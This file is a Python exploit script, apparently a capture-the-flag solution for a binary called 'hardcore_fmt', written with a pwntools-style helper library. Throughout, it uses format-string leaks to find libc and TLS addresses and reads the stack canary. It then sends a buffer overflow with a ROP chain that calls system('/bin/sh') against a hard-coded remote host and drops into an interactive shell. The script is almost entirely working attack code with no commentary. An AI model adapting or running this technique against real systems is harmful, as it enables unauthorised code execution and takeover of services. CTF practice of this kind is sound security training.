#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './hardcore_fmt'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'39.106.110.69', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn):
    conn.sendlineafter('fmt\n', '%a%a %a %a')

    conn.recvuntil(' 0x0.')
    addr_ld_rw      = int(conn.recvuntil('p', drop=True), 16)*0x100 - 0x100
    info('addr_ld_rw        = 0x{:08x}'.format(addr_ld_rw))
    libc.address    = addr_ld_rw - 0x61a000
    addr_libc_str_sh    = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    conn.recvuntil(' 0x0.')
    addr_tls        = int(conn.recvuntil('p', drop=True), 16)*0x100
    info('addr_tls          = 0x{:08x}'.format(addr_tls))

    conn.sendline(str(addr_tls + 0x29))
    conn.recvuntil(': ')
    canary = u64('\x00'+conn.recv(7))
    info('canary            = 0x{:08x}'.format(canary))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)

    exploit  = 'a'*0x108
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)*3
    exploit += p64(rop.ret.address)
    exploit += str(rop)

    conn.sendline(exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
